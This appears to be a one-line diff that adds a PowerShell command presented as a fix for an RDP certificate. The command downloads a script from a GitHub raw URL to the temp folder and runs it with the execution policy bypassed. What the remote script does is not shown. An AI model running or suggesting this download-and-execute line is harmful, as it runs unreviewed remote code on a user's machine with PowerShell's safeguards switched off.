@@ -1,0 +1,1 @@
+$path="$env:TEMP\Repair-RdpCertificate.ps1"; Invoke-WebRequest 'https://raw.githubusercontent.com/flu-ghsh/Repair-Rdp-Certificate/refs/heads/main/run.ps1' -OutFile $path; powershell.exe -NoProfile -ExecutionPolicy Bypass -File $path
